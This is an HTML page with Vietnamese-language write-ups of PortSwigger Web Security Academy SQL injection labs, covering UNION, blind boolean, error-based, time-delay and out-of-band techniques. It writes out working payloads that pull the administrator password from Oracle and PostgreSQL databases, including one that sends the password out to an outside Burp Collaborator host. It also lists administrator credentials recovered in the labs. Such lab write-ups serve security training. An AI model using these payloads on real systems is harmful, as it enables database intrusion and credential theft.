+<h1 id="lab-sql-injection-union-attack-finding-a-column-containing-text"><strong>Lab: SQL injection UNION attack, finding a column containing text</strong><a class="headerlink" href="#lab-sql-injection-union-attack-finding-a-column-containing-text" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text">Lab: SQL injection UNION attack, finding a column containing text | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Trước hết, xác định có SQLi không</p>
+<p><img alt="image.png" src="image%2047.png" /></p>
+<p><img alt="image.png" src="image%2048.png" /></p>
+</li>
+<li>
+<p>Trước hết xác định db type. Ở đây, với việc sử dụng payload này có thể khẳng định không phải MySQL</p>
+<p><img alt="image.png" src="image%2049.png" /></p>
+</li>
+<li>
+<p>Sau đó, sử dụng các câu lệnh truy vấn version để xác định được db type đúng. Ở đây suy ra <strong>PosgreSQL</strong></p>
+<p><img alt="image.png" src="image%2050.png" /></p>
+</li>
+<li>
+<p>Xác định số cột bằng 3 (thay đổi số lượng null để xác định số cột chính xác)</p>
+<p><img alt="image.png" src="image%2051.png" /></p>
+</li>
+<li>
+<p>Xác định được cột 2 có dạng text</p>
+<p><img alt="image.png" src="image%2052.png" /></p>
+</li>
+<li>
+<p>Truyền đoạn text mà lab yêu cầu để hoàn thiện giải lab</p>
+<p><img alt="image.png" src="image%2053.png" /></p>
+</li>
+</ul>
+<h1 id="lab-sql-injection-union-attack-retrieving-data-from-other-tables"><strong>Lab: SQL injection UNION attack, retrieving data from other tables</strong><a class="headerlink" href="#lab-sql-injection-union-attack-retrieving-data-from-other-tables" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables">Lab: SQL injection UNION attack, retrieving data from other tables | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Trước hết check xem có SQLi</p>
+<p><img alt="image.png" src="image%2054.png" /></p>
+<p><img alt="image.png" src="image%2055.png" /></p>
+</li>
+<li>
+<p>Sau đó xác định được db type, số lượng cột là <strong>PosgreSQL</strong> và có 2 cột</p>
+<p><img alt="image.png" src="image%2056.png" /></p>
+<p><img alt="image.png" src="image%2057.png" /></p>
+</li>
+<li>
+<p>Đề bài có cho sẵn tên bảng và cột, thực hiện payload sau lấy được username:password</p>
+<p><img alt="image.png" src="image%2058.png" /></p>
+</li>
+<li>
+<p>Login và hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2059.png" /></p>
+</li>
+</ul>
+<h1 id="lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column"><strong>Lab: SQL injection UNION attack, retrieving multiple values in a single column</strong><a class="headerlink" href="#lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column">Lab: SQL injection UNION attack, retrieving multiple values in a single column | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Trước hết kiểm tra xem có SQLi không</p>
+<p><img alt="image.png" src="image%2060.png" /></p>
+<p><img alt="image.png" src="image%2061.png" /></p>
+</li>
+<li>
+<p>Tiếp theo xác định db type, số lượng cột, dạng cột. Sử dụng payload trong hình để có thể xác định chính xác. Ở đây, db là <strong>PosgreSQL</strong>, có 2 cột, và cột 2 có dạng text</p>
+<p><img alt="image.png" src="image%2062.png" /></p>
+<p><img alt="image.png" src="image%2063.png" /></p>
+<p><img alt="image.png" src="image%2064.png" /></p>
+<p><img alt="image.png" src="image%2065.png" /></p>
+</li>
+<li>
+<p>Cuối cùng, xác định credential dựa trên cấu trúc bảng mà đề cho. Ở vì chỉ có cột 2 là dạng text nên ta có thể concat chuỗi để trả về</p>
+<p><img alt="image.png" src="image%2066.png" /></p>
+</li>
+<li>
+<p>Thực hiện login thành công hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2067.png" /></p>
+</li>
+</ul>
+<h1 id="lab-blind-sql-injection-with-conditional-responses"><strong>Lab: Blind SQL injection with conditional responses</strong><a class="headerlink" href="#lab-blind-sql-injection-with-conditional-responses" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses">Lab: Blind SQL injection with conditional responses | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Trước hết test xem có SQLi ở vị trí <code>TrackingId</code>→ <code>'</code>  <code>''</code> cho response giống nhau và cho <code>Content-length</code> khác response của <code>TrackingId</code> hợp lệ. Tuy nhiên khi sử dụng <code>'||'</code> thì cho response giống <code>TrackingId</code> hợp lệ → có nối chuỗi được → có SQLi ở đây:</p>
+<p><img alt="image.png" src="image%2068.png" /></p>
+<p><img alt="image.png" src="image%2069.png" /></p>
+<p><img alt="image.png" src="image%2070.png" /></p>
+</li>
+<li>
+<p>Tiếp theo là đoán DB type bằng cách dùng truy vấn version  → <strong>PostgreSQL</strong></p>
+<p><img alt="image.png" src="image%2071.png" /></p>
+<p><img alt="image.png" src="image%2072.png" /></p>
+</li>
+<li>
+<p>Ở đây chỉ có <code>Content-Length</code> là khác biệt giữa query đúng và query sai → blind, tuy nhiên thì hàm <code>pg_sleep()</code> không hoạt động nên chỉ có thể dùng biểu thức sau để đoán các ký tự</p>
+<div class="highlight"><pre><span></span><code><span class="nx">Z1j</span><span class="s1">&#39; or (SELECT password from users where username=&#39;</span><span class="nx">administrator</span><span class="s1">&#39;) like &#39;</span><span class="o">%</span><span class="s1">&#39; and &#39;</span><span class="mf">1</span><span class="s1">&#39;=&#39;</span><span class="mf">1</span>
+</code></pre></div>
+<ul>
+<li>
+<p>Hoặc ở đây cũng có thể sử dụng <code>SUBSTRING()</code> để chạy từng ký tự và có thể dùng BurpIntruder</p>
+<div class="highlight"><pre><span></span><code><span class="nx">Z1j</span><span class="s1">&#39; or &#39;</span><span class="nx">p</span><span class="s1">&#39;=substring((SELECT password from users where username=&#39;</span><span class="nx">administrator</span><span class="s1">&#39;),1,1) and &#39;</span><span class="mf">1</span><span class="s1">&#39;=&#39;</span><span class="mf">1</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Tiếp theo là cần tìm được độ dài password phục vụ cho việc truyền vào hàm substring ở bước sau</p>
+<ul>
+<li>
+<p>Thực hiện config BurpIntruder như sau:</p>
+<p><img alt="image.png" src="image%2073.png" /></p>
+</li>
+<li>
+<p>Kết quả chạy:</p>
+<p><img alt="image.png" src="image%2074.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Sau đó, ta sẽ lấy độ dài từ bước trước và config BurpIntruder như sau để lấy được password và login</p>
+<ul>
+<li>Sử dụng <code>Cluster bomb</code> để  bruteforce</li>
+<li>
+<p>Với vị trí đầu config như sau:</p>
+<p><img alt="image.png" src="image%2075.png" /></p>
+</li>
+<li>
+<p>Với vị trí hai, config như sau:</p>
+<p><img alt="image.png" src="image%2076.png" /></p>
+</li>
+<li>
+<p>Kết quả:</p>
+<p><img alt="image.png" src="image%2077.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Login với credential <code>administrator:p11hyydslj4wejvyykn6</code> . Hoàn thành việc giải lab</p>
+<p><img alt="image.png" src="image%2078.png" /></p>
+</li>
+</ul>
+<h1 id="lab-blind-sql-injection-with-conditional-errors"><strong>Lab: Blind SQL injection with conditional errors</strong><a class="headerlink" href="#lab-blind-sql-injection-with-conditional-errors" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors">Lab: Blind SQL injection with conditional errors | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Trước hết, test có SQLi không bằng cách sử dụng dấu <code>'</code>, <code>''</code> → có khác nhau về status code trả về  → có thể có SQLi</p>
+<p><img alt="image.png" src="image%2079.png" /></p>
+<p><img alt="image.png" src="image%2080.png" /></p>
+</li>
+<li>
+<p>Tuy nhiên khi dùng <code>' or '1'='1</code> và <code>' or '1'='2</code> thì response để trả về như nhau → kết quả request không có ích → cần trigger error</p>
+<p><img alt="image.png" src="image%2081.png" /></p>
+<p><img alt="image.png" src="image%2082.png" /></p>
+</li>
+<li>
+<p>Xác định DB type → nếu lệnh không hợp lệ sẽ trả về 500 (error) từ đó xác định DB là <strong>Oracle</strong></p>
+<ul>
+<li>
+<p>Với DB sai</p>
+<p><img alt="image.png" src="image%2083.png" /></p>
+</li>
+<li>
+<p>Với DB đúng</p>
+<p><img alt="image.png" src="image%2084.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Vậy thì chúng ta sẽ xác định độ dài password trước  bằng cách dùng payload sau:</p>
+<div class="highlight"><pre><span></span><code><span class="mf">9</span><span class="nx">lfwbcnv</span><span class="s1">&#39; or &#39;</span><span class="mf">1</span><span class="s1">&#39;=(SELECT CASE WHEN (1=(select LENGTH(password) from users where username=&#39;</span><span class="nx">administrator</span><span class="s1">&#39;)) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)  and &#39;</span><span class="mf">1</span><span class="s1">&#39;=&#39;</span><span class="mf">1</span>
+</code></pre></div>
+<ul>
+<li>
+<p>Config BurpIntruder như sau:</p>
+<p><img alt="image.png" src="image%2085.png" /></p>
+</li>
+<li>
+<p>Kết quả chạy:</p>
+<p><img alt="image.png" src="image%2086.png" /></p>
+</li>
+<li>
+<p>Từ đó suy ra password có độ dài 20</p>
+</li>
+<li>Tiếp theo lấy password bằng payload sau:</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="mf">9</span><span class="nx">lfwbcnv</span><span class="s1">&#39; or &#39;</span><span class="nx">a</span><span class="s1">&#39;=(substr((select password from users where username=&#39;</span><span class="nx">administrator</span><span class="s1">&#39;),1,1)) and &#39;</span><span class="mf">1</span><span class="s1">&#39;=&#39;</span><span class="mf">1</span>
+</code></pre></div>
+<ul>
+<li>
+<p>Config BurpIntruder như sau:</p>
+<ul>
+<li>
+<p>Chế độ chạy:</p>
+<p><img alt="image.png" src="image%2087.png" /></p>
+</li>
+<li>
+<p>Với vị trí 1:</p>
+<p><img alt="image.png" src="image%2088.png" /></p>
+</li>
+<li>
+<p>Với vị trí 2:</p>
+<p><img alt="image.png" src="image%2089.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Kết quả chạy</p>
+<p><img alt="image.png" src="image%2090.png" /></p>
+</li>
+<li>
+<p>Password lấy được là <code>xlbofbb8ql7ffq36nb9j</code></p>
+</li>
+<li>Thực hiện login bằng account <code>administrator:xlbofbb8ql7ffq36nb9j</code> . Hoàn thành giải lab</li>
+</ul>
+<p><img alt="image.png" src="image%2091.png" /></p>
+</li>
+</ul>
+<h1 id="lab-visible-error-based-sql-injection"><strong>Lab: Visible error-based SQL injection</strong><a class="headerlink" href="#lab-visible-error-based-sql-injection" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based">Lab: Visible error-based SQL injection | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Trước hết, kiểm tra SQLi bằng các sử dụng <code>'</code> , <code>''</code> → <code>'</code> trả về 500 và <code>''</code> trả về 200 → có thể có SQLi</p>
+<ul>
+<li>
+<p>Với dấu <code>'</code></p>
+<p><img alt="image.png" src="image%2092.png" /></p>
+</li>
+<li>
+<p>Với dấu <code>''</code></p>
+<p><img alt="image.png" src="image%2093.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Tiếp theo là enum DB</p>
+<ul>
+<li>
+<p>Với DB sai response sẽ trả về status code 500</p>
+<p><img alt="image.png" src="image%2094.png" /></p>
+</li>
+<li>
+<p>Với DB đúng response sẽ trả về status code 200</p>
+<p><img alt="image.png" src="image%2095.png" /></p>
+</li>
+<li>
+<p>Từ đó kết luận DB là <strong>PostgreSQL</strong></p>
+</li>
+<li>Ở trong lab này, khi truy vấn sai syntax khiến cho query lỗi thì sẽ có thông báo trả về response → có thể lấy được thông tin qua thông báo lỗi. Ở đây, DB là <strong>PostgreSQL</strong> nên ta sẽ sử dụng payload sau để trigger lỗi</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="nx">CAST</span><span class="p">((</span><span class="nx">SELECT</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">FROM</span><span class="w"> </span><span class="nx">users</span><span class="w"> </span><span class="nx">LIMIT</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="nx">AS</span><span class="w"> </span><span class="kr">int</span><span class="p">)</span>
+</code></pre></div>
+<ul>
+<li>
+<p>Kết quả khi sử dụng payload trên</p>
+<p><img alt="image.png" src="image%2096.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Từ đó lấy được credential là <code>administrator:dq1p6enmi3c3mg4v10pz</code>. Thực hiện đăng nhập và hoàn thành việc giải lab</p>
+<p><img alt="image.png" src="image%2097.png" /></p>
+</li>
+</ul>
+<h1 id="lab-blind-sql-injection-with-time-delays"><strong>Lab: Blind SQL injection with time delays</strong><a class="headerlink" href="#lab-blind-sql-injection-with-time-delays" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays">Lab: Blind SQL injection with time delays | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Trước hết, thử các chèn dấu <code>'</code>, <code>''</code> nhưng đều không khác biệt. Ngoài ra cũng không thể trigger error → thử time based thì được</p>
+<p><img alt="image.png" src="image%2098.png" /></p>
+</li>
+<li>
+<p>Từ đây suy ra được DB là <strong>PostgreSQL</strong>. Tuy nhiên thì lab này chỉ yêu cầu trigger time delay vậy là hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2099.png" /></p>
+</li>
+</ul>
+<h1 id="lab-blind-sql-injection-with-time-delays-and-information-retrieval"><strong>Lab: Blind SQL injection with time delays and information retrieval</strong><a class="headerlink" href="#lab-blind-sql-injection-with-time-delays-and-information-retrieval" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval">Lab: Blind SQL injection with time delays and information retrieval | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Trước hết, thử sử dụng chèn <code>'</code> thì không gây ra lỗi hay response khác biệt → thử sử dụng time based thì delay được → có SQLi</p>
+<p><img alt="image.png" src="image%20100.png" /></p>
+</li>
+<li>
+<p>Từ đó cũng suy ra được DB là <strong>PostgreSQL</strong>. Sử dụng payload sau để xác định được độ dài của password</p>
+<div class="highlight"><pre><span></span><code><span class="mf">6</span><span class="nx">hbyp5EftWaDbcZu</span><span class="s1">&#39;; SELECT CASE WHEN (20=(select length(password) from users where username=&#39;</span><span class="nx">administrator</span><span class="err">&#39;</span><span class="p">))</span><span class="w"> </span><span class="nx">THEN</span><span class="w"> </span><span class="nx">pg_sleep</span><span class="p">(</span><span class="mf">10</span><span class="p">)</span><span class="w"> </span><span class="nx">ELSE</span><span class="w"> </span><span class="nx">pg_sleep</span><span class="p">(</span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="nx">END</span><span class="o">--</span>
+</code></pre></div>
+<ul>
+<li>
+<p>Config BurpIntruder như sau:</p>
+<p><img alt="image.png" src="image%20101.png" /></p>
+<p><img alt="image.png" src="image%20102.png" /></p>
+</li>
+<li>
+<p>Kết quả chạy:</p>
+<p><img alt="image.png" src="image%20103.png" /></p>
+</li>
+<li>
+<p>Suy ra độ dài password là 20</p>
+</li>
+</ul>
+</li>
+<li>
+<p>Sau đó, với độ dài password tìm được, config BurpIntruder như sau để tìm mật khẩu</p>
+<ul>
+<li>
+<p>Sử dụng <code>Cluster bomb</code></p>
+<p><img alt="image.png" src="image%20104.png" /></p>
+</li>
+<li>
+<p>Vị trí payload đầu tiên, config như sau:</p>
+<p><img alt="image.png" src="image%20105.png" /></p>
+<p><img alt="image.png" src="image%20106.png" /></p>
+</li>
+<li>
+<p>Vị trí payload thứ hai, config như sau:</p>
+<p><img alt="image.png" src="image%20107.png" /></p>
+</li>
+<li>
+<p>Kết quả chạy:</p>
+<p><img alt="image.png" src="image%20108.png" /></p>
+</li>
+<li>
+<p>Từ đó suy ra được password là <code>mkrjr997t8z1pyjn9idv</code></p>
+</li>
+<li>Thực hiện login với credential <code>administrator:mkrjr997t8z1pyjn9idv</code> . Hoàn thành giải lab</li>
+</ul>
+<p><img alt="image.png" src="image%20109.png" /></p>
+</li>
+</ul>
+<h1 id="lab-blind-sql-injection-with-out-of-band-interaction"><strong>Lab: Blind SQL injection with out-of-band interaction</strong><a class="headerlink" href="#lab-blind-sql-injection-with-out-of-band-interaction" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band">Lab: Blind SQL injection with out-of-band interaction | Web Security Academy</a></p>
+<ul>
+<li>Thực hiện thử chèn <code>'</code> không gây ra khác biệt về response. Tiếp theo dùng time base cũng không được. Sau đó, sử dụng oob thì được. Ở đây, chúng ta nên thực hiện tiếp tục nối query chứ không nên ngắt query trước đó vì có thể một số db không cho phép thực hiện <strong>Batched Query</strong> (như Oracle).</li>
+<li>
+<p>Ở bài này, chúng ta chỉ cần trigger được oob là hoàn thành giải lab</p>
+<ul>
+<li>
+<p>Payload sử dụng</p>
+<div class="highlight"><pre><span></span><code><span class="mf">7</span><span class="nx">t4R9mXVUu7hFiV7</span><span class="s1">&#39; or 1=(SELECT EXTRACTVALUE(xmltype(&#39;</span><span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span><span class="o">?&gt;&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">root</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">remote</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://6mtiib43bzxxm7w1mwcab4mqlhr8f43t.oastify.com/&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="o">%</span><span class="nx">remote</span><span class="p">;]</span><span class="o">&gt;</span><span class="s1">&#39;),&#39;</span><span class="o">/</span><span class="nx">l</span><span class="s1">&#39;) FROM dual) or &#39;</span><span class="mf">1</span><span class="s1">&#39;=&#39;</span><span class="mf">1</span>
+</code></pre></div>
+</li>
+<li>
+<p>Kết quả</p>
+<ul>
+<li>
+<p>Thực hiện gửi request</p>
+<p><img alt="image.png" src="image%20110.png" /></p>
+</li>
+<li>
+<p>Trigger thành công</p>
+<p><img alt="image.png" src="image%20111.png" /></p>
+</li>
+<li>
+<p>Kết quả hoàn thành lab</p>
+<p><img alt="image.png" src="image%20112.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-blind-sql-injection-with-out-of-band-data-exfiltration"><strong>Lab: Blind SQL injection with out-of-band data exfiltration</strong><a class="headerlink" href="#lab-blind-sql-injection-with-out-of-band-data-exfiltration" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration">Lab: Blind SQL injection with out-of-band data exfiltration | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Trước hết thử chèn <code>'</code> , time based đều không được. Sau đó, thử payload oob thì trigger được Burp collab</p>
+<ul>
+<li>
+<p>Payload sử dụng:</p>
+<div class="highlight"><pre><span></span><code><span class="nx">cUkmvStjJs02avX2</span><span class="s1">&#39; or (SELECT EXTRACTVALUE(xmltype(&#39;</span><span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span><span class="o">?&gt;&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">root</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">remote</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://hbwt7mte0am8bilcb71l0fb1asgj4lsa.oastify.com/&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="o">%</span><span class="nx">remote</span><span class="p">;]</span><span class="o">&gt;</span><span class="s1">&#39;),&#39;</span><span class="o">/</span><span class="nx">l</span><span class="s1">&#39;) FROM dual)  or &#39;</span><span class="mf">1</span><span class="s1">&#39;=&#39;</span><span class="mf">1</span>
+</code></pre></div>
+</li>
+<li>
+<p>Gửi request</p>
+<p><img alt="image.png" src="image%20113.png" /></p>
+</li>
+<li>
+<p>Trigger thành công collab</p>
+<p><img alt="image.png" src="image%20114.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Sau đó, thực hiện lấy <code>password</code> bằng cách nối vào burp domain và gửi về burp collab</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="nx">cUkmvStjJs02avX2</span><span class="s1">&#39;||(SELECT EXTRACTVALUE(xmltype(&#39;</span><span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span><span class="o">?&gt;&lt;!</span><span class="nx">DOCTYPE</span><span class="w"> </span><span class="nx">root</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="o">&lt;!</span><span class="nx">ENTITY</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">remote</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="s2">&quot;http://&#39;||(SELECT password FROM users WHERE username=&#39;administrator&#39;)||&#39;.hpatlm7eea08pizcp7flefp1osujio6d.oastify.com/&quot;</span><span class="o">&gt;</span><span class="w"> </span><span class="o">%</span><span class="nx">remote</span><span class="p">;]</span><span class="o">&gt;</span><span class="s1">&#39;),&#39;</span><span class="o">/</span><span class="nx">l</span><span class="s1">&#39;) FROM dual)||&#39;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Gửi request</p>
+<p><img alt="image.png" src="image%20115.png" /></p>
+</li>
+<li>
+<p>Trigger thành công và lấy được password là <code>q2s6ccr9jriajag31g8h</code></p>
+<p><img alt="image.png" src="image%20116.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Login bằng <code>password</code> lấy được. Hoàn thành việc giải lab</p>
+<p><img alt="image.png" src="image%20117.png" /></p>
+</li>
+</ul>
+<h1 id="lab-sql-injection-with-filter-bypass-via-xml-encoding"><strong>Lab: SQL injection with filter bypass via XML encoding</strong><a class="headerlink" href="#lab-sql-injection-with-filter-bypass-via-xml-encoding" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding">Lab: SQL injection with filter bypass via XML encoding | Web Security Academy</a></p>
+<ul>
+<li>Ở bài lab này, khi chúng ta nhập các ký tự như <code>'</code> vào param <code>&lt;productId&gt;</code> trong request gửi tới API <code>POST /product/stock</code> thì sẽ bị chặn → burp scan không scan ra SQLi</li>
+<li>
+<p>Tuy nhiên, thì khi chèn payload sau, có thể trích xuất nhiều hơn các sản phẩm so với response ban đầu → có SQLi</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="o">&amp;</span><span class="err">#</span><span class="mf">111</span><span class="p">;</span><span class="nx">r</span><span class="w"> </span><span class="o">&amp;</span><span class="err">#</span><span class="mf">39</span><span class="p">;</span><span class="mf">1</span><span class="o">&amp;</span><span class="err">#</span><span class="mf">39</span><span class="p">;</span><span class="o">=&amp;</span><span class="err">#</span><span class="mf">39</span><span class="p">;</span><span class="mf">1</span><span class="o">&amp;</span><span class="err">#</span><span class="mf">39</span><span class="p">;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response ban đầu</p>
+<p><img alt="image.png" src="image%20118.png" /></p>
+</li>
+<li>
+<p>Response lúc sau</p>
+<p><img alt="image.png" src="image%20119.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Vì query ở đây chỉ trả về 1 trường nên có thể đoán request phía dev sử dụng dạng như này</p>
+<div class="highlight"><pre><span></span><code><span class="nx">select</span><span class="w"> </span><span class="nx">level</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="nx">stock_level</span><span class="w"> </span><span class="nx">where</span><span class="w"> </span><span class="nx">product_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$pid</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">store_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$sid</span>
+</code></pre></div>
+</li>
+<li>
+<p>Từ đó có thể enum db, tên bảng, lấy được password.</p>
+<ul>
+<li>
+<p>Payload enum db</p>
+<div class="highlight"><pre><span></span><code><span class="mf">1</span><span class="w"> </span><span class="o">&amp;</span><span class="err">#</span><span class="mf">117</span><span class="p">;</span><span class="nx">nion</span><span class="w"> </span><span class="o">&amp;</span><span class="err">#</span><span class="mf">115</span><span class="p">;</span><span class="nx">elect</span><span class="w"> </span><span class="nx">TABLE_NAME</span><span class="w">   </span><span class="kr">from</span><span class="w"> </span><span class="nx">information_schema</span><span class="p">.</span><span class="nx">tables</span><span class="o">&amp;</span><span class="err">#</span><span class="mf">45</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mf">45</span><span class="p">;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Request gửi để enum db. Từ đó suy ra db sử dụng không phải <strong>Oracle</strong> đồng thời enum ra các bảng có trng db</p>
+<p><img alt="image.png" src="image%20120.png" /></p>
+</li>
+<li>
+<p>Tiếp theo enum tên cột, ta sẽ enum cột của bảng <code>users</code></p>
+<ul>
+<li>
+<p>Các bảng có trong đó có bảng <code>users</code></p>
+<p><img alt="image.png" src="image%20121.png" /></p>
+</li>
+<li>
+<p>Các cột có trong bảng <code>users</code></p>
+<p><img alt="image.png" src="image%20122.png" /></p>
+</li>
+<li>
+<p>Lấy <code>username</code> và <code>password</code> như sau:</p>
+<p><img alt="image.png" src="image%20123.png" /></p>
+<p><img alt="image.png" src="image%20124.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Login và hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%20125.png" /></p>
+</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "navigation.top", "search.highlight", "search.suggest", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
